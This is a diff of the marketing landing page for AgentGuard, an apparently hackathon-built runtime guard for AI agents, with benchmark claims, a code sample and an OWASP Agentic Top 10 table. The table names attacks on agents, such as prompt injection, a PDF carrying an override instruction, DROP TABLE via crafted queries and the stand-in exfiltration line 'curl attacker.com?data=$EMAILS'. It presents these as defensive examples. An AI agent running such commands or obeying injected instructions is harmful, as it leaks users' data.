+          <p class="pillar-body">
+            Per-tool rules know the difference between a SELECT and a DROP, an
+            allowed domain and an exfiltration attempt, a temp file and a credential.
+            Risky calls escalate to a human or an AI reviewer.
+          </p>
+        </article>
 
-  requestAnimationFrame(step);
-}
+        <article class="pillar" data-reveal data-reveal-delay="3">
+          <div class="pillar-num">03</div>
+          <h3>Catch the slow attacks</h3>
+          <p class="pillar-tag">Detect drift, escalation, and multi-step attack chains across an entire session.</p>
+          <p class="pillar-body">
+            Online machine learning learns each agent's normal behavior from the
+            first call. It flags the patterns that span dozens of tool invocations —
+            the kind a single rule check will never see.
+          </p>
+        </article>
+      </div>
+    </div>
+  </section>
 
-document.addEventListener('DOMContentLoaded', () => {
-  // Animate stats after a short delay
-  setTimeout(() => {
-    animateCounter(document.getElementById('stat-security'), 97.5, '%', 800);
-    animateCounter(document.getElementById('stat-layers'), 5, '', 800);
+  <!-- ============================================================ PROOF -->
+  <section class="proof">
+    <div class="proof-inner">
+      <div class="section-eyebrow" data-reveal>Proof</div>
+      <h2 data-reveal data-reveal-delay="1">The numbers, in case you don't trust the words.</h2>
+      <div class="proof-grid">
+        <div class="proof-stat" data-reveal data-reveal-delay="1">
+          <div class="proof-num"><span class="counter" data-target="96">0</span><span>%</span></div>
+          <div class="proof-label">attacks blocked across a 40-test adversarial suite. Unguarded baseline: 7.5%.</div>
+        </div>
+        <div class="proof-stat" data-reveal data-reveal-delay="2">
+          <div class="proof-num"><span class="counter" data-target="10">0</span><span>/10</span></div>
+          <div class="proof-label">OWASP Agentic Top 10 categories covered.</div>
+        </div>
+        <div class="proof-stat" data-reveal data-reveal-delay="3">
+          <div class="proof-num"><span class="counter" data-target="218">0</span></div>
+          <div class="proof-label">unit and end-to-end tests. All green.</div>
+        </div>
+        <div class="proof-stat" data-reveal data-reveal-delay="4">
+          <div class="proof-num"><span class="counter" data-target="0.65" data-decimals="2">0</span><span>s</span></div>
+          <div class="proof-label">mean block latency on the offline fast path. No API call required.</div>
+        </div>
+      </div>
+      <div class="proof-source">
+        Source: <a href="https://github.com/wildcraft958/AgentGuard_NamoFans/blob/main/docs/benchmarks.md" target="_blank" rel="noopener">docs/benchmarks.md</a>
+      </div>
+    </div>
+  </section>
 
-    // Blocked counter: animate numerator
-    const blockedEl = document.getElementById('stat-blocked');
-    const startB = performance.now();
-    (function stepB(now) {
-      const elapsed = now - startB;
-      const progress = Math.min(elapsed / 800, 1);
-      const eased = 1 - Math.pow(1 - progress, 3);
-      blockedEl.textContent = Math.round(eased * 39) + '/40';
-      if (progress < 1) requestAnimationFrame(stepB);
-    })(startB);
-  }, 200);
-});
+  <!-- ============================================================ DEVELOPER -->
+  <section class="dev">
+    <div class="dev-inner">
+      <div class="section-eyebrow" data-reveal>Developer experience</div>
+      <h2 data-reveal data-reveal-delay="1">One decorator. Full pipeline. No rearchitecting.</h2>
+      <pre class="code" data-reveal data-reveal-delay="2"><code><span class="c-kw">from</span> agentguard <span class="c-kw">import</span> guard_agent
 
-// =========================================================
-//  COPY TO CLIPBOARD
-// =========================================================
+<span class="c-dec">@guard_agent</span>(config=<span class="c-str">"agentguard.yaml"</span>)
+<span class="c-kw">def</span> <span class="c-fn">my_agent</span>(message: <span class="c-ty">str</span>) -&gt; <span class="c-ty">str</span>:
+    <span class="c-kw">return</span> llm.complete(message)</code></pre>
+      <p class="dev-caption" data-reveal data-reveal-delay="3">That's it. The full 4-layer pipeline now wraps every call — input, tool use, output, audit log.</p>
+    </div>
+  </section>
 
-function copyCode() {
-  const code = `from agentguard import guard_agent
+  <!-- ============================================================ DEMO CTA -->
+  <section class="demo-cta">
+    <div class="demo-cta-inner" data-reveal>
+      <div class="demo-cta-copy">
+        <div class="section-eyebrow">See it live</div>
+        <h2>Attack a real agent. In your browser. Right now.</h2>
+        <p>
+          We built four agents you can attack right now — Financial, HR, Medical,
+          and an 82-tool maximally vulnerable agent. Pick any of the predefined
+          attack prompts, or write your own. Toggle AgentGuard on and off and
+          watch exactly which layer fires, with full OpenTelemetry traces.
+        </p>
+        <a class="btn btn-primary" href="/demo" target="_blank" rel="noopener">Open the demo console →</a>
+        <a class="btn btn-ghost" href="/dashboard" target="_blank" rel="noopener">View live dashboard</a>
+      </div>
+      <div class="demo-cta-visual">
+        <img src="assets/demo.png" alt="The AgentGuard demo console with guarded vs unguarded toggle and predefined attack scenarios" />
+      </div>
+    </div>
+  </section>
 
-@guard_agent(
-    param="message",
-    output_field="response",
-    config="agentguard.yaml",
-)
-def my_agent(message: str) -> dict:
-    response = llm.complete(message)
-    return {"response": response}`;
+  <!-- ============================================================ OWASP -->
+  <section id="owasp" class="owasp">
+    <div class="owasp-inner">
+      <div class="section-eyebrow" data-reveal>Coverage</div>
+      <h2 data-reveal data-reveal-delay="1">Built for the OWASP Agentic Top 10.</h2>
+      <p class="owasp-sub" data-reveal data-reveal-delay="2">
+        Every category in the 2025 OWASP Agentic AI Top 10, mapped to a real
+        attack and the AgentGuard layer that stops it.
+      </p>
+      <div class="owasp-table-wrap" data-reveal data-reveal-delay="3">
+        <table class="owasp-table">
+          <thead>
+            <tr>
+              <th>OWASP Risk</th>
+              <th>Real-world example</th>
+              <th>How AgentGuard handles it</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>AT-01</strong> Prompt Injection</td>
+              <td>EchoLeak (CVE-2025-32711, CVSS 9.3) — zero-click data exfiltration via M365 Copilot</td>
+              <td>Blocked at input by the offline pattern filter and Azure Prompt Shields before it reaches the model.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-02</strong> Excessive Agency</td>
+              <td>Agent writes or deletes files outside its scope</td>
+              <td>The tool firewall denies any call that violates the policy. Role-based rules block out-of-scope actions.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-03</strong> Memory Poisoning</td>
+              <td>Adversarial PDF embeds an override instruction the agent later reads</td>
+              <td>Indirect injection patterns are caught at the input layer, and tool outputs are scanned before re-entering the loop.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-04</strong> Insecure Tool Use</td>
+              <td>SQL injection or DROP TABLE via a crafted query</td>
+              <td>SQL queries are parsed; DROP, DELETE, UPDATE, and unauthorized schemas are denied at the firewall.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-05</strong> Resource Exhaustion</td>
+              <td>Runaway tool-call loops draining API quota or compute</td>
+              <td>The behavioral engine flags abnormal call rates and patterns, then escalates to a human reviewer.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-06</strong> Data Exfiltration</td>
+              <td><code>curl attacker.com?data=$EMAILS</code> hidden in agent output</td>
+              <td>HTTP calls hit a domain allowlist before they fire. Read-then-exfil chains are detected by the session graph.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-07</strong> Privilege Escalation</td>
+              <td>Agent assumes an admin role mid-session</td>
+              <td>Roles are locked at the policy layer. The drift monitor catches gradual sensitivity escalation across calls.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-08</strong> Supply Chain Attack</td>
+              <td>Malicious tool injected at runtime by a compromised dependency</td>
+              <td>Only registered tools can be invoked. Anything outside the allowed registry is denied immediately.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-09</strong> Hallucination Exploit</td>
+              <td>Fabricated tool result triggers a real-world action</td>
+              <td>Output is checked for groundedness, PII, and toxicity before it ever reaches the user.</td>
+            </tr>
+            <tr>
+              <td><strong>AT-10</strong> Unsafe Coordination</td>
+              <td>Agent A commands Agent B to do something neither is allowed to do alone</td>
+              <td>Inter-agent permissions are evaluated against the same policy that governs single-agent actions.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
 
-  navigator.clipboard.writeText(code).then(() => {
-    const btn = document.getElementById('copy-btn');
-    btn.classList.add('copied');
-    btn.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> COPIED`;
-    setTimeout(() => {
-      btn.classList.remove('copied');
-      btn.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> COPY`;
-    }, 2000);
-  });
-}
-</script>
+  <!-- ============================================================ TEAM -->
+  <section id="team" class="team">
+    <div class="team-inner">
+      <div class="section-eyebrow" data-reveal>Built by</div>
+      <h2 data-reveal data-reveal-delay="1">Five engineers, one weekend's worth of ambition.</h2>
+      <p class="team-sub" data-reveal data-reveal-delay="2">
+        Team NamoFans · IIT Kharagpur · AI Unlocked 2026 — Track 5: Trustworthy AI
+      </p>
+      <div class="team-grid">
+        <a class="team-card" href="https://github.com/wildcraft958" target="_blank" rel="noopener" data-reveal data-reveal-delay="1">
+          <div class="team-initials">AR</div>
+          <div class="team-name">Animesh Raj</div>
+          <div class="team-role">Research &amp; Docs</div>
+          <div class="team-handle">@wildcraft958</div>
+        </a>
+        <a class="team-card" href="https://github.com/atulsingh200" target="_blank" rel="noopener" data-reveal data-reveal-delay="2">
+          <div class="team-initials">AS</div>
+          <div class="team-name">Atul Singh</div>
+          <div class="team-role">AI/ML Architecture</div>
+          <div class="team-handle">@atulsingh200</div>
+        </a>
+        <a class="team-card" href="https://github.com/Devansh-bit" target="_blank" rel="noopener" data-reveal data-reveal-delay="3">
+          <div class="team-initials">DG</div>
+          <div class="team-name">Devansh Gupta</div>
+          <div class="team-role">Backend &amp; Cloud</div>
+          <div class="team-handle">@Devansh-bit</div>
+        </a>
+        <a class="team-card" href="https://github.com/premagarwals" target="_blank" rel="noopener" data-reveal data-reveal-delay="4">
+          <div class="team-initials">PA</div>
+          <div class="team-name">Prem Agarwal</div>
+          <div class="team-role">Security &amp; Safety</div>
+          <div class="team-handle">@premagarwals</div>
+        </a>
+        <a class="team-card" href="https://github.com/MFZNK05" target="_blank" rel="noopener" data-reveal data-reveal-delay="4">
+          <div class="team-initials">MF</div>
+          <div class="team-name">Mohd Faizan Khan</div>
+          <div class="team-role">Backend &amp; Cloud</div>
+          <div class="team-handle">@MFZNK05</div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================ FINAL CTA -->
+  <section class="final-cta">
+    <div class="final-cta-inner">
+      <h2 data-reveal>See AgentGuard in action.</h2>
+      <p data-reveal data-reveal-delay="1">The dashboard is live. The agents are vulnerable. Pick an attack and watch the layers fire.</p>
+      <div class="final-cta-buttons" data-reveal data-reveal-delay="2">
+        <a class="btn btn-primary btn-large" href="/demo" target="_blank" rel="noopener">Try the live demo →</a>
+        <a class="btn btn-ghost btn-large" href="https://github.com/wildcraft958/AgentGuard_NamoFans" target="_blank" rel="noopener">Star on GitHub</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================ FOOTER -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <div class="footer-brand-row">
+          <img src="assets/logo.png" alt="AgentGuard" />
+          <span>AgentGuard</span>
+        </div>
+        <p>Validate every action your AI agents take, before it executes.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>Product</h4>
+          <a href="#why">Why AgentGuard</a>
+          <a href="#platform">Platform</a>
+          <a href="#owasp">OWASP coverage</a>
+        </div>
+        <div class="footer-col">
+          <h4>Resources</h4>
+          <a href="https://github.com/wildcraft958/AgentGuard_NamoFans/blob/main/README.md" target="_blank" rel="noopener">Documentation</a>
+          <a href="https://github.com/wildcraft958/AgentGuard_NamoFans/blob/main/docs/benchmarks.md" target="_blank" rel="noopener">Benchmarks</a>
+          <a href="https://github.com/wildcraft958/AgentGuard_NamoFans/blob/main/DEMO.md" target="_blank" rel="noopener">Layer deep dive</a>
+        </div>
+        <div class="footer-col">
+          <h4>Live</h4>
+          <a href="/demo" target="_blank" rel="noopener">Demo console</a>
+          <a href="/dashboard" target="_blank" rel="noopener">Dashboard</a>
+          <a href="https://github.com/wildcraft958/AgentGuard_NamoFans" target="_blank" rel="noopener">GitHub</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 Team NamoFans · IIT Kharagpur · Built for AI Unlocked 2026 · MIT License
+    </div>
+  </footer>
+
+  <script>
+    (function () {
+      const reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+      // Sticky-nav scroll state
+      const onScroll = () => {
+        if (window.scrollY > 50) document.body.classList.add('scrolled');
+        else document.body.classList.remove('scrolled');
+      };
+      window.addEventListener('scroll', onScroll, { passive: true });
+      onScroll();
+
+      if (reduce) {
+        // Reveal everything immediately, freeze counters at final values
+        document.querySelectorAll('[data-reveal]').forEach(el => el.classList.add('is-visible'));
+        document.querySelectorAll('.counter').forEach(el => {
+          const target = parseFloat(el.dataset.target);
+          const dec = parseInt(el.dataset.decimals || '0', 10);
+          el.textContent = dec ? target.toFixed(dec) : Math.round(target).toString();
+        });
+        return;
+      }
+
+      // Counter animation
+      const animateCounter = (el) => {
+        const target = parseFloat(el.dataset.target);
+        const dec = parseInt(el.dataset.decimals || '0', 10);
+        const duration = 1400;
+        const start = performance.now();
+        const tick = (now) => {
+          const t = Math.min(1, (now - start) / duration);
+          // easeOutCubic
+          const eased = 1 - Math.pow(1 - t, 3);
+          const value = target * eased;
+          el.textContent = dec ? value.toFixed(dec) : Math.round(value).toString();
+          if (t < 1) requestAnimationFrame(tick);
+        };
+        requestAnimationFrame(tick);
+      };
+
+      // IntersectionObserver for reveals
+      const io = new IntersectionObserver((entries) => {
+        entries.forEach((entry) => {
+          if (!entry.isIntersecting) return;
+          const el = entry.target;
+          el.classList.add('is-visible');
+          el.querySelectorAll('.counter').forEach(animateCounter);
+          io.unobserve(el);
+        });
+      }, { threshold: 0.15, rootMargin: '0px 0px -60px 0px' });
+
+      document.querySelectorAll('[data-reveal]').forEach((el) => io.observe(el));
+    })();
+  </script>
+
 </body>
 </html>
